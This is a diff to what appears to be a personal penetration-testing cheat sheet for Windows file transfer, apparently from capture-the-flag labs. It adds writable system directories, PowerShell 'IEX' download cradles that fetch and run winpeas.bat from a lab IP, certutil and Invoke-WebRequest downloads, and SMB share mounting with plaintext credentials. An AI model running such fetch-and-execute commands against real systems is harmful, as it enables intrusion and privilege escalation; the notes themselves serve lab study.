@@ -27,12 +27,51 @@ def do_PUT(self):
 
 
 # Windows 
+
+## Writable Directories
+```
+C:\Windows\Tasks 
+
+C:\Windows\Temp 
+
+C:\windows\tracing
+
+C:\Windows\Registration\CRMLog
+
+C:\Windows\System32\FxsTmp
+
+C:\Windows\System32\com\dmp
+
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+
+C:\Windows\System32\spool\PRINTERS
+
+C:\Windows\System32\spool\SERVERS
+
+C:\Windows\System32\spool\drivers\color
+
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+
+C:\Windows\SysWOW64\FxsTmp
+
+C:\Windows\SysWOW64\com\dmp
+
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+## Powershell
 ```powershell
 Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')"
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')
 
-Invoke-WebRequest -Uri 10.10.16.4/winpeas.bbat -OutFile winpeas.bat
+Invoke-WebRequest -Uri 10.10.16.4/winpeas.bat -OutFile winpeas.bat
+
+IWR -Uri http://10.10.10.10/winpeas.bat -OutFile winpeas.bat
 
 ````
 
@@ -42,6 +81,30 @@ Invoke-WebRequest -Uri 10.10.16.4/winpeas.bbat -OutFile winpeas.bat
 certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
 ```
 
+## SMB
+
+### copy
+
+![[SMB 443#SMB server]]
+### connect smb windows powershell
+```powershell
+
+
+$pass = convertto-securestring '1234' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('super', $pass)
+New-PSDrive -Name super -PSProvider FileSystem -Credential 
+$cred -Root \\10.10.17.185\super
+
+# add $pass variable with the share password 1234
+# add $cred with the share creds username: super password: $pass variable
+# New-PSDrive mount share
+
+```
+### Mount share
+
+```
+net use z: \\10.10.10.10\SHARENAME
+```
 
 # php
 ```php
